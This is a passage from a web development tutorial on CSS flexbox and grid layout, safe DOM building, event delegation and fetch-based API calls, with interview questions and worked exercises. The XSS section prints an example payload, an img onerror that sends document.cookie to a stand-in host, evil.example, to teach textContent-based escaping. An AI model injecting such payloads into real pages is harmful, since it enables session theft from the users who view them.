Flexbox lays out children in one direction, a row or a column, and handles spacing and alignment along it: perfect for a toolbar or a stack of cards. Grid lays out children in two dimensions, rows and columns at once: perfect for a page with a form panel beside a list. A media query applies rules only when a condition holds, such as "the screen is at least 48rem wide". Mobile-first means writing the small-screen layout as the default and adding wider layouts inside media queries.

Why does it exist?

Because the same page must work on a 360-pixel phone and a 1,920-pixel monitor, and more than half of web traffic is from phones. Before flexbox and grid, layouts were built with floats and hacks that broke easily. Today, a dozen lines of CSS give you a layout that adapts to any width.

How it works

Flexbox for the toolbar. The title goes left and the Refresh button right, vertically centred:

CSS
.toolbar {
  display: flex;                    /* children become flex items in a row */
  align-items: center;              /* centre them vertically (the cross axis) */
  justify-content: space-between;   /* push them to opposite ends (the main axis) */
  gap: var(--gap);                  /* space between items, no margin tricks */
  padding: 0.75rem 1rem;
  border-bottom: 1px solid var(--border);
}
.toolbar h1 { margin: 0; font-size: 1.25rem; }

Flexbox for the card list, as a column with gaps, and inside each card a row that wraps on narrow screens:

CSS
.cards { list-style: none; margin: 0; padding: 0; display: flex; flex-direction: column; gap: 0.75rem; }
.card {
  display: flex;
  flex-wrap: wrap;                  /* on a narrow phone the button drops to the next line */
  align-items: center;
  gap: 0.5rem 1rem;                 /* row gap, column gap */
  padding: 0.75rem 1rem;
  border: 1px solid var(--border);
  border-radius: 8px;
}
.card h3 { margin: 0; font-size: 1rem; flex: 1 1 12rem; }   /* grow and shrink, ideally 12rem wide */
.card .meta { margin: 0; color: var(--muted); }

flex: 1 1 12rem is shorthand for "grow to fill spare space, shrink if needed, start from 12rem". It makes the product name take all the room the price and button do not need.

Grid plus one media query, mobile-first. On a phone, the form panel and the list stack vertically. On a screen at least 48rem (768px at the default font size) wide, they sit side by side with the form in a fixed 20rem column:

CSS
.layout { display: grid; gap: var(--gap); padding: var(--gap); }   /* default: one column, stacked */
.panel  { border: 1px solid var(--border); border-radius: 8px; padding: var(--gap); }

@media (min-width: 48rem) {                                          /* only on wider screens */
  .layout { grid-template-columns: 20rem 1fr; align-items: start; }  /* form column, then the rest */
}

1fr means "one fraction of the remaining space". Writing the single-column layout first and adding the two-column version with min-width is mobile-first: phones download and apply the simplest rules, and the media query is the only thing that differs. The viewport meta tag from 7.2.1 is what makes this work; without it, phones pretend to be 980 pixels wide and the media query matches the wrong layout.

Edge cases & failure modes

  • display: flex on an element with the hidden attribute shows it anyway, because your rule overrides the browser's [hidden] { display: none }. Add [hidden] { display: none !important; } once, or do not set display on elements you hide.
  • Long unbroken text (a 60-character SKU, a URL) can overflow a card; overflow-wrap: anywhere lets it break.
  • Fixed pixel widths inside a flexible layout cause sideways scrolling on small screens; prefer rem, percentages, fr and minmax().
  • Too many breakpoints make every change a puzzle; one or two media queries cover most admin screens.

How a Senior Backend Engineer thinks about this

A backend engineer writing an internal tool does not need pixel-perfect design; they need a layout that never hides a button, works on a phone, keeps a visible focus ring, and is easy for the next person to change. They keep CSS small, class-based and mobile-first, use flexbox for one-dimensional rows and columns and grid for page structure, and stop there. When a screen becomes a product, they hand design to people who do it for a living, with Part 75 (75.4) as the shared vocabulary.

Interview questions

  1. How does the browser decide which of two conflicting CSS declarations applies?
    Show answerHide answer
    Importance, then inline styles, then specificity (IDs, then classes/attributes/pseudo-classes, then types), then source order: the later rule wins a tie.
  2. Why is box-sizing: border-box almost always set?
    Show answerHide answer
    So width includes padding and border, making sizes predictable and stopping overflow.
  3. When would you use flexbox and when grid?
    Show answerHide answer
    Flexbox for one-dimensional rows or columns such as toolbars and lists; grid for two-dimensional page layouts with rows and columns.
  4. What does mobile-first mean in CSS?
    Show answerHide answer
    Write the small-screen styles as the default and add wider layouts inside min-width media queries.

Practical exercise

Two parts. First, predict the colour of the product name in <ul id="product-list" class="cards"><li class="card"><h3 class="title">Mirror</h3></li></ul> given these rules, in this order: .card .title { color: green }, h3 { color: black }, #product-list h3 { color: red }, .cards .card .title { color: blue }. Second, write CSS for a header with a logo on the left and three nav links on the right that wraps neatly on a phone. Acceptance criteria: the colour is justified with specificity scores, and the header uses flexbox with gap, no fixed widths.

Worked answer to the exercise

Show worked answerHide worked answer

The scores: .card .title is (0,2,0); h3 is (0,0,1); #product-list h3 is (1,0,1); .cards .card .title is (0,3,0). The ID rule wins: red. Three classes never beat one ID, because the first column is compared first, and source order only matters between equal scores.

CSS
.site-header {
  display: flex;
  flex-wrap: wrap;                 /* on a phone the nav drops below the logo */
  align-items: center;
  justify-content: space-between;
  gap: 0.5rem 1.5rem;
  padding: 0.75rem 1rem;
}
.site-header nav { display: flex; flex-wrap: wrap; gap: 1rem; }
.site-header nav a { padding: 0.5rem 0; }   /* a taller touch target without changing the layout */

7.4 JavaScript in the browser

7.4.1 The DOM, creating elements safely, and XSS

Concept

When the browser parses HTML, it builds the DOM: a tree of objects, one per element, that JavaScript can read and change. Changing the DOM changes the page immediately. document is the root of that tree. document.querySelector('#product-list') finds the first element matching a CSS selector (or returns null), and document.querySelectorAll('.card') finds all of them. To add content, you create elements and put text into them.

The rule that matters most: put user data into the page with textContent, never with innerHTML. textContent treats a string as text. innerHTML parses a string as HTML, which means a product name can become a script.

Why does it exist?

The DOM exists so that pages can change without reloading: a new product appears in the list, an error appears under a field. The safety rule exists because the data you render is not yours. A product name typed by one staff member, an order note typed by a customer, a review: all of it passes through your API and lands in someone else's browser. If that browser parses it as HTML, the author of the data can run code in the reader's session.

Mental model

Imagine a printing press that prints whatever is on the order form. With textContent, the press prints the words exactly as written, even if someone wrote "and also unlock the back door". With innerHTML, the press reads the form as instructions, and it will unlock the back door. Same text, completely different result.

How it works

Building a product card with DOM methods:

JavaScript
function productCard(p) {
  const li = document.createElement('li');   // a new element, not yet in the page
  li.className = 'card';
  li.dataset.id = p.id;                      // becomes data-id="..." for later lookups

  const title = document.createElement('h3');
  title.textContent = p.name;                // TEXT: "<b>" shows as the three characters < b >

  const meta = document.createElement('p');
  meta.className = 'meta';
  meta.textContent = `${p.sku} - ${formatPrice(p.priceCents, p.currency)}`;

  const del = document.createElement('button');
  del.type = 'button';
  del.dataset.action = 'delete';
  del.textContent = 'Delete';
  del.setAttribute('aria-label', `Delete ${p.name}`);   // attributes set this way are not parsed as HTML

  li.append(title, meta, del);               // assemble the card off-screen
  return li;                                 // the caller puts it in the page in one step
}

document.querySelector('#product-list').append(productCard(product));

The everyday DOM toolkit:

Task Method
Find one / many querySelector(sel), querySelectorAll(sel)
Create document.createElement('li')
Set text el.textContent = value
Add to the page parent.append(a, b), parent.prepend(a)
Replace all children parent.replaceChildren(...nodes) (no arguments empties it)
Remove el.remove()
Data attributes el.dataset.id reads and writes data-id
Classes el.classList.add('is-error'), .remove(), .toggle()
Show and hide el.hidden = true

XSS in one paragraph. Cross-site scripting (XSS) is an attacker's script running inside your page, in your user's browser, with your user's session. The Part 6 DTO accepts any name of 1 to 200 characters, so <img src=x onerror="fetch('https://evil.example/c?d='+document.cookie)"> is a valid product. With title.textContent = p.name, staff see that odd string and nothing happens. With li.innerHTML = '<h3>' + p.name + '</h3>', the browser creates an image, it fails to load, and the onerror code runs for every admin who opens the page, able to read what the page reads and call your API as that admin. Stored in your database and served to others, this is stored XSS, the most damaging kind. The fix is boring and total: build elements and use textContent for every piece of data. Part 44 (44.21) covers XSS and Content Security Policy from the server side; Part 81 (81.7) covers the frontend side, including React's escaping and what dangerouslySetInnerHTML undoes.

Failure scenario

At 10:40 on a Monday, support reports that the admin product page "flickers and then logs everyone out". In DevTools the on-call engineer sees requests to an unknown domain in the Network panel and an <img> element in one product card that should not exist. A product imported on Friday has an HTML payload as its name, and the card was built with innerHTML and a template string. The API did nothing wrong: it stored a string. The team rotates sessions, rewrites the card with createElement and textContent, adds a Content Security Policy (Part 44, 44.33), and adds a test that creates a product named <img src=x onerror=alert(1)> and asserts the page shows it as text. Escaping belongs where data meets HTML, in every client.

Edge cases & failure modes

  • querySelector returns null when the selector matches nothing (a typo, or the script ran before the element existed); the next line fails with "Cannot read properties of null".
  • Building HTML strings with + or template literals is innerHTML in disguise; so are insertAdjacentHTML and outerHTML.
  • Attributes built into strings: '<a href="' + url + '">' can be broken out of with a quote; use a.href = url and only allow https: URLs, because javascript: URLs run code.
  • Thousands of nodes appended one by one, each forcing layout, can be slow; build off-screen and append once, or paginate (the Part 6 API already caps pages at 100).

How a Senior Backend Engineer thinks about this

A senior does not try to "clean" HTML out of product names in the API. Data can legitimately contain < and & (a product called "Scaler & Tips "), and the same string is rendered into HTML, CSV, emails and mobile apps, each needing different escaping. So the API validates shape and length, stores the string as given, and every client encodes at output. In code review, any innerHTML with a variable in it is a blocking comment.

7.4.2 Events, delegation and the browser event loop

Concept

The page tells your code what the user did through events: click, submit, input, keydown and many more. You subscribe with element.addEventListener('click', handler), and the browser calls handler(event) each time. Most events bubble: after firing on the element that was clicked, they fire on its parent, then its parent's parent, all the way to document. Event delegation uses this: instead of a listener on every Delete button, put one listener on the list and work out which button was clicked.

All of this runs on the browser's main thread, which, like Node's thread (Part 2, 2.1.1), runs one piece of JavaScript at a time, driven by an event loop.

Why does it exist?

Events exist because a page waits for people, just as a server waits for requests. Delegation exists because lists change: products are added after the page loads, and a listener attached to buttons at start-up never sees the new ones. One listener on a stable parent handles today's buttons and tomorrow's.

How it works

JavaScript
const list = document.querySelector('#product-list');

list.addEventListener('click', (event) => {
  // event.target is the innermost element clicked; it may be the button or something inside it
  const button = event.target.closest('button[data-action="delete"]');
  if (!button || !list.contains(button)) return;   // a click elsewhere in the list: ignore
  const card = button.closest('li');
  console.log('delete product', card.dataset.id);
});

event.target is what was clicked; event.currentTarget is the element whose listener is running (the list). closest(selector) walks up from the target to the nearest ancestor matching the selector, so a click on an icon inside the button still finds the button. event.preventDefault() cancels the browser's default action, such as a form's navigation (7.2.2); event.stopPropagation() stops bubbling and is rarely what you want, because it breaks delegation further up.

The browser event loop, compared with Node. The browser runs a loop that is close to the one you met in Part 2: take one task (a click handler, a timer callback, a network response), run it to completion, then run every queued microtask (promise continuations, the code after an await), then repeat. The big addition is rendering: between tasks, roughly 60 times a second, the browser may recalculate styles and layout and paint the screen.

Node.js (Part 2, Part 13) Browser main thread
One thread runs your JavaScript yes yes
Tasks come from timers, I/O, sockets (libuv phases) user input, timers, network responses, messages
Microtasks drained after each task yes yes
Rendering none between tasks, about every 16.7 ms at 60 Hz
What blocking costs you every other request waits the page freezes: no clicks, no scrolling, no paint

The consequence is the same lesson as Node, with a more visible symptom. If a click handler spends 800 ms sorting 200,000 products, nothing else happens for 800 ms: the button does not show its pressed state, the spinner does not spin, typing is lost. fetch does not block (the network wait happens outside your JavaScript, like I/O in Node), but heavy synchronous work does. Keep handlers short, let the server sort and paginate, and see Part 75 (75.7) for long tasks and Part 13 (13.16, 13.17) for the Node side in depth.

Edge cases & failure modes

  • Listeners added before elements exist do nothing; delegation or running the script after parsing (a module script, 7.8) avoids this.
  • Adding the same listener in a function that runs on every refresh attaches it again each time; one click then runs the handler five times. Attach listeners once at start-up.
  • event.target is not always the element you styled: clicking the text inside a button gives the button, but clicking an <svg> icon inside it gives the icon. Use closest.

Interview questions

  1. Why must user data be rendered with textContent rather than innerHTML?
    Show answerHide answer
    innerHTML parses the string as HTML, so data containing markup can run script (XSS); textContent always treats it as text.
  2. What is event delegation and when is it useful?
    Show answerHide answer
    One listener on a parent that uses bubbling and event.target.closest() to handle events from many children, including ones added later.
  3. How does the browser's event loop differ from Node's?
    Show answerHide answer
    Both run one task at a time and drain microtasks after each; the browser also renders between tasks, so blocking JavaScript freezes the page visibly.
  4. A spinner you show before a heavy loop never appears. Why?
    Show answerHide answer
    The browser can only paint between tasks; the loop runs in the same task, so the screen updates after it finishes.

Practical exercise

Given const orders = [{ id: 'o1', customer: 'Asha <VIP>', totalCents: 4599, status: 'paid' }, { id: 'o2', customer: 'Ravi', totalCents: 1250, status: 'pending' }], render each order into a <ul id="orders"> as a card showing the customer and total, with a Cancel button only for pending orders. Handle all Cancel clicks with one delegated listener that logs the order id. Acceptance criteria: "Asha " appears literally on screen, no innerHTML is used, and a card added later also responds to its Cancel button.

Worked answer to the exercise

Show worked answerHide worked answer
JavaScript
const ordersEl = document.querySelector('#orders');

function orderCard(o) {
  const li = document.createElement('li');
  li.dataset.id = o.id;
  const who = document.createElement('strong');
  who.textContent = o.customer;                         // "<VIP>" stays text
  const total = document.createElement('span');
  total.textContent = ` ${(o.totalCents / 100).toFixed(2)}`;
  li.append(who, total);
  if (o.status === 'pending') {
    const cancel = document.createElement('button');
    cancel.type = 'button';
    cancel.dataset.action = 'cancel';
    cancel.textContent = 'Cancel';
    li.append(cancel);
  }
  return li;
}

ordersEl.replaceChildren(...orders.map(orderCard));

ordersEl.addEventListener('click', (event) => {          // attached once, works for future cards
  const btn = event.target.closest('button[data-action="cancel"]');
  if (!btn) return;
  console.log('cancel order', btn.closest('li').dataset.id);
});

ordersEl.append(orderCard({ id: 'o3', customer: 'Meera', totalCents: 999, status: 'pending' }));

Clicking Cancel on the third card logs cancel order o3 even though that card did not exist when the listener was attached, because the click bubbles up to #orders.

7.5 Calling the Part 6 API with fetch

7.5.1 Reading the product list: status codes and the three states

Concept

fetch(url, options) is the browser's built-in function for making HTTP requests from JavaScript. It returns a promise (Part 2, 2.3) that resolves to a Response object as soon as the response headers arrive. The Response tells you the status (res.status, res.ok) and headers; reading the body is a second asynchronous step, such as await res.json().

The single most important fact about fetch: it resolves for every HTTP response, including 404 and 500. It rejects only when no response was received at all: the server is down, the network dropped, the request was aborted, or CORS blocked it. Checking the status is your job.

Why does it exist?

Because a page needs data after it has loaded, without navigating away. Older code used XMLHttpRequest; fetch replaced it with a promise-based design that fits async/await. Node 18 and newer ship the same fetch, so if you used it in Part 2 or Part 3, the browser version will feel identical. The browser adds rules Node does not have: CORS (7.6), cookies and a shared HTTP cache.

Mental model

Imagine sending a courier to a warehouse. fetch resolving means the courier came back with a parcel. It does not mean the parcel contains what you ordered: inside might be a note saying "out of stock" (404) or "our system is down" (500). fetch rejecting means the courier never reached the warehouse, or you called them back. You must open the parcel (check the status) before you celebrate.

How it works

The Products screen sends every request through one small helper, so status handling, JSON parsing, the error shape and the timeout are written once. It lives in its own module, api.js (7.8 explains modules):

JavaScript
// api.js -- one place that knows how to talk to the Part 6 API
const API_BASE = document.querySelector('meta[name="api-base"]')?.content ?? '';
const TIMEOUT_MS = 8000;

export class ApiError extends Error {
  constructor(status, problem) {
    super(problem?.title ?? `Request failed with status ${status}`);
    this.status = status;                        // 0 means no HTTP response at all
    this.code = problem?.code ?? 'HTTP_ERROR';   // stable code from the Part 6 filter (6.6)
    this.issues = problem?.issues ?? [];         // [{ path, message }] for field errors
    this.requestId = problem?.requestId ?? null; // quote this when reporting a bug
  }
}

export async function api(path, { method = 'GET', body } = {}) {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), TIMEOUT_MS);   // never wait forever
  try {
    const res = await fetch(API_BASE + path, {
      method,
      headers: body === undefined ? {} : { 'Content-Type': 'application/json' },
      body: body === undefined ? undefined : JSON.stringify(body),
      signal: controller.signal,
    });
    if (res.status === 204) return null;                            // DELETE: success, no body
    const type = res.headers.get('content-type') ?? '';
    const data = type.includes('json') ? await res.json() : null;   // json and problem+json
    if (!res.ok) throw new ApiError(res.status, data);              // 4xx and 5xx become errors
    return data;
  } catch (err) {
    if (err instanceof ApiError) throw err;
    if (err instanceof SyntaxError) {                               // a body that claimed to be JSON but was not
      throw new ApiError(0, { code: 'BAD_RESPONSE', title: 'The server sent a response that could not be read' });
    }
    if (err.name === 'AbortError') {
      throw new ApiError(0, { code: 'TIMEOUT', title: 'The server took too long to answer' });
    }
    throw new ApiError(0, { code: 'NETWORK', title: 'Could not reach the server' });   // down, offline or CORS
  } finally {
    clearTimeout(timer);
  }
}

What happens for each kind of outcome:

And what the screen does with each status the Part 6 API can return:

Status When the Part 6 API sends it What the UI does
200 list or get succeeded render the data
201 product created add the card, reset the form
204 product deleted remove the card
400 VALIDATION_FAILED DTO rules failed (6.6) put each issues[].message under its field
404 PRODUCT_NOT_FOUND the product is gone remove it from the screen, say so
409 PRODUCT_SKU_TAKEN unique SKU violated (6.6) message under the SKU field (the API already sets path: "sku")
5xx INTERNAL_ERROR a bug or an outage generic message plus the requestId
none (status 0 here) offline, server down, CORS, timeout "Could not reach the server", offer a retry

The three states. Any screen that loads data is in one of a few states, and each needs something visible. A list that shows nothing while loading, nothing when empty, and nothing on error leaves the user unable to tell the three apart.

Practical example

Loading the list, with the cursor pagination from 6.5 behind a "Load more" button:

JavaScript
// app.js (part)
import { api } from './api.js';

const list = document.querySelector('#product-list');
const statusEl = document.querySelector('#status');
const loadMoreBtn = document.querySelector('#load-more');
let nextCursor = null;

function setStatus(text, isError = false) {
  statusEl.textContent = text;
  statusEl.classList.toggle('is-error', isError);
}

async function loadProducts({ append = false } = {}) {
  setStatus('Loading products...');                         // state: loading
  loadMoreBtn.disabled = true;
  try {
    const params = new URLSearchParams({ limit: '20' });    // never glue query strings by hand (3.2)
    if (append && nextCursor) params.set('cursor', nextCursor);
    const page = await api(`/products?${params}`);          // { items, nextCursor } since 6.5
    if (!append) list.replaceChildren();
    list.append(...page.items.map(productCard));
    nextCursor = page.nextCursor;
    loadMoreBtn.hidden = nextCursor === null;
    setStatus(list.children.length === 0 ? 'No products yet. Add the first one with the form.' : '');  // empty or loaded
  } catch (err) {
    const ref = err.requestId ? ` (reference ${err.requestId})` : '';
    setStatus(`Could not load products: ${err.message}${ref}`, true);          // state: failed
  } finally {
    loadMoreBtn.disabled = false;
  }
}

Note page.items, not page. In 6.2 the list endpoint returned a plain array; in 6.5 it became { items, nextCursor }. A frontend written against the old shape is the most common cause of "the list is empty but the API works", and 7.7 debugs exactly that.

Edge cases & failure modes

  • Treating every resolved fetch as success: a 500 body gets rendered as if it were products, or page.items is undefined and the page breaks.
  • An HTML error page from a proxy (a load balancer's 502) is not JSON; checking Content-Type before parsing avoids a confusing SyntaxError: Unexpected token '<'.
  • Responses that arrive out of order: press Refresh twice quickly and the older, slower response can land last. Cancelling the previous request with its AbortController fixes it; Part 78 (78.10) covers this pattern.

7.5.2 Creating a product: errors next to fields, timeouts and double submits

Concept

Creating a product joins everything so far: intercept the form's submit, read and convert the values, POST JSON, and then either show the new product or put each validation message next to the field it belongs to. Two extra protections make it production-shaped: a timeout, so a hung request does not leave the user waiting forever, and double-submit protection, so an impatient double click does not send two requests.

Why does it exist?

Because forms are where users meet your validation rules, and a vague "Something went wrong" at the top of a form makes them guess which of five fields was wrong. Part 6 went to the trouble of returning issues with a path for every problem (6.6) precisely so a client could do better. Timeouts and double-submit guards exist because networks are slow and people click twice; Part 6's senior mantra applies in the browser too: can it time out, can it duplicate, can it partially succeed?

How it works

JavaScript
// app.js (part)
import { api } from './api.js';

const form = document.querySelector('#create-form');
const formError = document.querySelector('#form-error');
const FIELD_FOR_PATH = { name: 'name', sku: 'sku', priceCents: 'price', currency: 'currency' };  // API path -> form field
let submitting = false;

form.addEventListener('submit', async (event) => {
  event.preventDefault();                          // stop the browser's own submit and navigation (7.2.2)
  if (submitting) return;                          // a second Enter or click while the first is in flight
  clearErrors();

  const data = new FormData(form);                 // reads every named control
  const priceText = String(data.get('price') ?? '').trim();
  const body = {
    name: String(data.get('name') ?? '').trim(),
    sku: String(data.get('sku') ?? '').trim().toUpperCase(),
    priceCents: priceText === '' ? null : Math.round(Number(priceText) * 100),  // 12.99 -> 1299
    currency: String(data.get('currency') ?? 'USD'),
  };

  const button = form.querySelector('button[type="submit"]');
  submitting = true;
  button.disabled = true;
  button.textContent = 'Saving...';
  try {
    const created = await api('/products', { method: 'POST', body });
    list.prepend(productCard(created));            // newest first, like the API's order
    form.reset();
    setStatus('');
    form.querySelector('#name').focus();           // ready for the next product
  } catch (err) {
    showErrors(err);
  } finally {
    submitting = false;
    button.disabled = false;
    button.textContent = 'Add product';
  }
});

function clearErrors() {
  formError.textContent = '';
  for (const slot of form.querySelectorAll('[data-error-for]')) slot.textContent = '';
  for (const input of form.querySelectorAll('[aria-invalid]')) input.removeAttribute('aria-invalid');
}

function showErrors(err) {
  let placed = 0;
  for (const issue of err.issues) {
    const field = FIELD_FOR_PATH[issue.path];      // only known fields; never build selectors from raw input
    const slot = field ? form.querySelector(`[data-error-for="${field}"]`) : null;
    if (!slot) continue;
    slot.textContent = slot.textContent ? `${slot.textContent} ${issue.message}` : issue.message;
    form.elements.namedItem(field)?.setAttribute('aria-invalid', 'true');
    placed += 1;
  }
  if (placed === 0 || placed < err.issues.length) {  // nothing field-shaped: show it at the form level
    formError.textContent = err.requestId ? `${err.message} (reference ${err.requestId})` : err.message;
  }
  form.querySelector('[aria-invalid="true"]')?.focus();   // take keyboard and screen reader users to the first problem
}

Step by step:

  1. event.preventDefault() cancels the navigation from 7.2.2; your code now owns the request.
  2. FormData reads the form by name, and every value is a string, so the code converts. Math.round matters: 19.99 * 100 is 1998.9999999999998 in JavaScript (binary floating point, Part 1), which @IsInt() rejects. An empty price becomes null, so the server reports it instead of the client silently sending 0.
  3. The body holds only DTO fields. Sending the form's raw price key would make forbidNonWhitelisted reject the whole request (6.2).
  4. Errors land next to fields. FIELD_FOR_PATH maps the DTO path (priceCents) to the form field (price). A duplicate SKU needs no special case: the Part 6 filter already returns issues: [{ path: "sku" }] with the 409. Anything unmapped (a 500, a timeout) appears at the form level with the request ID.
  5. Accessibility comes along. aria-invalid turns the field red (7.3) and makes the screen reader say "invalid entry"; aria-describedby (7.2.2) reads the message with the field when focus moves there.

The timeout. api() creates an AbortController, passes its signal to fetch, and calls controller.abort() after 8 seconds. Aborting makes the pending fetch (or a body read in progress) reject with an AbortError, which api() turns into code: 'TIMEOUT'. Modern browsers also offer AbortSignal.timeout(8000) as a one-line version; it rejects with a TimeoutError instead. The explicit controller is shown because the same object also lets you cancel a request on purpose, such as when the user presses Refresh again.

A timeout on a POST carries a catch that Part 2 (2.5) and Part 3 (3.1) warned about: the request may have succeeded on the server. The browser stopped waiting; PostgreSQL may have committed the row a moment later. Retrying blindly could create a duplicate. Here the unique SKU protects us: a retry of the same product gets a 409 PRODUCT_SKU_TAKEN, and the user can press Refresh and see that it exists. Resources without a natural unique key need an idempotency key sent by the client; Part 18 (18.12) designs that on the server and Part 78 (78.6) sends it from the browser.

Double-submit protection. The submitting flag and the disabled button work together. The flag stops a second submit that starts before the first await, such as a fast double press of Enter. The disabled button tells the user something is happening and stops a second click. Both are reset in finally, so an error cannot leave the form stuck. Part 77 (77.8) shows the same idea in React.

Edge cases & failure modes

  • Server messages use DTO names: "priceCents must not be less than 0" sits under a field labelled "Price". Mapping codes and paths to friendly text is a contract question Part 80 (80.6) handles; for an internal tool the raw message is acceptable.
  • A 400 with an issue path the form does not have (a nested path, a field added on the server later): it falls through to the form-level message, so it is never silently lost.
  • Prices in currencies without cents (the Japanese yen has no minor unit): dividing by 100 is wrong; the Part 6 model assumes two decimal places, which is a product decision to make explicit.

How a Senior Backend Engineer thinks about this

A senior reads this code and checks the contract at each seam: every DTO field has a form field, every issues[].path maps to exactly one place on screen, every status has a visible outcome, and nothing is retried that could duplicate a write without a unique key or idempotency key behind it. They notice that the backend's error design is what made the frontend simple: one shape, a path per issue, a stable code, a requestId. That is the argument they make to a team that wants to return free-text errors: the cost lands in every client.

Common mistakes

  • Showing "Something went wrong" for every error, throwing away the issues the API provides.
  • No timeout, so a dropped connection shows "Saving..." forever.
  • Retrying a timed-out POST automatically with no unique or idempotency key.

Interview questions

  1. Does fetch reject on a 404 or 500?
    Show answerHide answer
    No. It resolves with a Response; check res.ok or res.status. It rejects only when there is no response: network failure, CORS block or abort.
  2. How would you show server validation errors next to the right form fields?
    Show answerHide answer
    Return a list of issues with a field path from the API, map each path to a form control, put the message in that control's error element and set aria-invalid; show unmapped errors at the form level.
  3. A create request times out in the browser. Is it safe to retry?
    Show answerHide answer
    Not automatically; the server may have committed it. Retry is safe only with a natural unique key (a 409 reveals the duplicate) or an idempotency key the server deduplicates on.
  4. Why both a flag and a disabled button for double-submit protection?
    Show answerHide answer
    The flag covers submits that arrive before the UI updates or come from the keyboard; the disabled button gives feedback and blocks clicks; finally resets both.

Practical exercise

Add inline price editing to each card: an "Edit price" button that swaps the price text for a small form with a labelled number input and Save/Cancel buttons, sends PATCH /products/:id with { "priceCents": ... } (6.5), and shows a 400 message next to the input. Acceptance criteria: one delegated listener handles Edit, Save and Cancel for all cards; a negative price shows the API's message under the input; a successful save updates the card's price text; a 404 removes the card with a status message; Save is disabled while the request is in flight.

Worked answer to the exercise

Show worked answerHide worked answer

A <template> in index.html holds the editor's static markup; cloning it is safe because it contains no user data:

HTML
<template id="price-editor">
  <form class="price-edit" novalidate>
    <label>New price <input name="price" type="number" min="0" step="0.01" required></label>
    <button type="submit">Save</button>
    <button type="button" data-action="cancel-edit">Cancel</button>
    <p class="error"></p>
  </form>
</template>
JavaScript
// app.js (addition). productCard gains a button with data-action="edit-price".
const editorTpl = document.querySelector('#price-editor');

list.addEventListener('click', (event) => {
  const btn = event.target.closest('button[data-action]');
  if (!btn) return;
  const card = btn.closest('li');
  if (btn.dataset.action === 'cancel-edit') card.querySelector('.price-edit').remove();
  if (btn.dataset.action === 'edit-price' && !card.querySelector('.price-edit')) {
    card.append(editorTpl.content.cloneNode(true));
    card.querySelector('.price-edit input').focus();
  }
});

list.addEventListener('submit', async (event) => {    // submit events bubble too: one listener for every editor
  const f = event.target.closest('.price-edit');
  if (!f) return;
  event.preventDefault();
  const card = f.closest('li');
  const save = f.querySelector('button[type="submit"]');
  const msg = f.querySelector('.error');
  save.disabled = true;
  msg.textContent = '';
  try {
    const updated = await api(`/products/${encodeURIComponent(card.dataset.id)}`, {
      method: 'PATCH',
      body: { priceCents: Math.round(Number(f.elements.price.value) * 100) },
    });
    card.replaceWith(productCard(updated));           // show what the database stored, not what was typed
  } catch (err) {
